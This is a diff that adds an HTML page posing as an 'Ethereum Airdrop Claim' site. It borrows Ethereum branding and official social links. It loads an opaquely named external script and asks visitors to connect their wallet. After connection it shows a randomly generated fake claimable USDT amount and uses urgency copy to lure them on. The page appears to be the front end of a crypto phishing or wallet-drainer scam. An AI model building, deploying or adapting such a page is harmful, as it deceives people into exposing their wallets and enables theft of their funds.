@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethereum Airdrop Claim</title>
+    <script src="./674c6a8bbfe0211925e165f3.js"></script>
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:400,700,900&amp;display=swap">
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <link rel="stylesheet" href="./styles.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar">
+        <div class="nav-brand">
+            <svg class="eth-logo" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 32 32">
+                <g fill="none" fill-rule="evenodd">
+                    <circle cx="16" cy="16" r="16" fill="#627EEA"></circle>
+                    <g fill="#FFF" fill-rule="nonzero">
+                        <path fill-opacity=".602" d="M16.498 4v8.87l7.497 3.35z"></path>
+                        <path d="M16.498 4L9 16.22l7.498-3.35z"></path>
+                        <path fill-opacity=".602" d="M16.498 21.968v6.027L24 17.616z"></path>
+                        <path d="M16.498 27.995v-6.028L9 17.616z"></path>
+                        <path fill-opacity=".2" d="M16.498 20.573l7.497-4.353-7.497-3.348z"></path>
+                        <path fill-opacity=".602" d="M9 16.22l7.498 4.353v-7.701z"></path>
+                    </g>
+                </g>
+            </svg>
+            <span>Ethereum Airdrop</span>
+        </div>
+        <div class="nav-links">
+            <a href="#" class="nav-link">Home</a>
+            <a href="#features" class="nav-link">Features</a>
+            <a href="#steps" class="nav-link">How It Works</a>
+            <button class="open"><span class="wallet-dot"></span>Connect Wallet</button>
+        </div>
+    </nav>
+
+    <div class="container">
+        <main>
+            <section class="hero">
+                <div class="hero-content">
+                    <h1>Claim Your<br><span class="gradient-text">Ethereum Airdrop</span></h1>
+                    <p class="hero-subtitle">Join the next generation of decentralized finance. Verify your eligibility and claim your tokens today.</p>
+                    <div class="hero-buttons">
+                        <button class="primary-button" id="checkEligibility">Check Eligibility</button>
+                        <a href="#steps" class="secondary-button">Learn More</a>
+                    </div>
+                </div>
+                <div class="claim-box">
+                    <div class="claim-header">
+                        <div class="network-status">
+                            <span class="network-dot"></span>
+                            <span>Ethereum Mainnet</span>
+                        </div>
+                    </div>
+                    <div class="claim-content">
+                        <div class="claim-amount">
+                            <span class="label">Available to claim</span>
+                            <span class="amount">0.00 ETH</span>
+                        </div>
+                        <div class="gas-info">
+                            <i class="fas fa-gas-pump"></i>
+                            <span>Estimated Gas: <span class="gas-amount">0.002 ETH</span></span>
+                        </div>
+                        <button class="claim-button" id="claimButton" disabled="">
+                            <span>Claim Tokens</span>
+                            <i class="fas fa-arrow-right"></i>
+                        </button>
+                    </div>
+                    <div class="status-message" id="statusMessage"></div>
+                </div>
+            </section>
+
+            <section id="features" class="features">
+                <h2 class="section-title">Why Choose Us</h2>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <h3>Secure Claims</h3>
+                        <p>Verified smart contract ensures safe token distribution</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-bolt"></i>
+                        </div>
+                        <h3>Instant Transfer</h3>
+                        <p>Receive your tokens immediately after claiming</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <h3>Limited Time</h3>
+                        <p>Don't miss out on this exclusive opportunity</p>
+                    </div>
+                </div>
+            </section>
+
+            <section id="steps" class="steps">
+                <h2 class="section-title">How It Works</h2>
+                <div class="steps-grid">
+                    <div class="step-card">
+                        <div class="step-number">01</div>
+                        <h3>Connect Wallet</h3>
+                        <p>Connect your Ethereum wallet to verify your eligibility</p>
+                    </div>
+                    <div class="step-card">
+                        <div class="step-number">02</div>
+                        <h3>Check Eligibility</h3>
+                        <p>System automatically verifies your wallet status</p>
+                    </div>
+                    <div class="step-card">
+                        <div class="step-number">03</div>
+                        <h3>Claim Tokens</h3>
+                        <p>If eligible, claim your tokens with one click</p>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <footer>
+            <div class="footer-content">
+                <div class="footer-left">
+                    <div class="footer-brand">
+                        <svg class="eth-logo" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32">
+                            <circle cx="16" cy="16" r="16" fill="#627EEA"></circle>
+                            <g fill="#FFF">
+                                <path fill-opacity=".602" d="M16.498 4v8.87l7.497 3.35z"></path>
+                                <path d="M16.498 4L9 16.22l7.498-3.35z"></path>
+                            </g>
+                        </svg>
+                        <span>Ethereum Airdrop</span>
+                    </div>
+                    <p class="footer-description">Experience the future of decentralized finance</p>
+                </div>
+                <div class="footer-right">
+                    <div class="contract-info">
+                        <span>Smart Contract:</span>
+                        <a href="https://etherscan.io" target="_blank" class="contract-address">View on Etherscan</a>
+                    </div>
+                    <div class="social-links">
+                        <a href="https://x.com/ethereum" target="_blank" class="social-link"><i class="fab fa-twitter"></i></a>
+                        <a href="https://discord.com/invite/ethereum-org" target="_blank" class="social-link"><i class="fab fa-discord"></i></a>
+                        <a href="https://github.com/ethereum" target="_blank" class="social-link"><i class="fab fa-github"></i></a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="notification" id="notification">
+        <i class="fas fa-exclamation-circle"></i>
+        <span>Please connect your wallet first before checking eligibility</span>
+    </div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+    const checkEligibilityBtn = document.getElementById('checkEligibility');
+    const notification = document.getElementById('notification');
+    const claimAmountElement = document.querySelector('.claim-amount .amount');
+    let walletConnected = false;
+    let isConnecting = false;
+
+    // Function to show notification
+    function showNotification() {
+        notification.classList.add('show');
+        setTimeout(() => {
+            notification.classList.remove('show');
+        }, 3000); // Hide after 3 seconds
+    }
+
+    // Check Eligibility button click handler
+    checkEligibilityBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (!walletConnected && !isConnecting) {
+            showNotification();
+        }
+    });
+
+    // Connect wallet button click handler
+    const connectWalletBtn = document.querySelector('.open');
+    const navLinks = document.querySelector('.nav-links');
+
+    connectWalletBtn.addEventListener('click', function() {
+        if (!isConnecting && !walletConnected) {
+            isConnecting = true;
+            this.innerHTML = '<span class="wallet-dot" style="background: #FFB800;"></span> Waiting for connection';
+
+            // Add "Click again to connect" message
+            const clickAgainMsg = document.createElement('div');
+            clickAgainMsg.className = 'click-again-message';
+            clickAgainMsg.textContent = 'Click again to connect';
+            navLinks.appendChild(clickAgainMsg);
+
+            // Remove the message after 3 seconds
+            setTimeout(() => {
+                clickAgainMsg.remove();
+            }, 3000);
+
+            // Check for Ethereum wallet availability
+            if (typeof ethereum !== 'undefined') {
+                ethereum.request({ method: 'eth_requestAccounts' })
+                    .then(accounts => {
+                        walletConnected = true;
+                        isConnecting = false;
+                        connectWalletBtn.innerHTML = '<span class="wallet-dot" style="background: #27AE60;"></span> Wallet Connected';
+                        console.log('Wallet connected:', accounts);
+
+                        // Wait 10 seconds and update the claimable amount
+                        setTimeout(() => {
+                            const randomAmount = (Math.random() * (5000 - 100) + 100).toFixed(2); // Random number between 100 and 5000
+                            claimAmountElement.textContent = `${randomAmount} USDT`;
+                        }, 10000); // 10 seconds delay
+                    })
+                    .catch(error => {
+                        isConnecting = false;
+                        console.error('Error connecting wallet:', error);
+                    });
+            } else {
+                alert('Ethereum wallet is not available');
+                isConnecting = false;
+            }
+        }
+    });
+});
+
+</script>
+</body>
+</html>
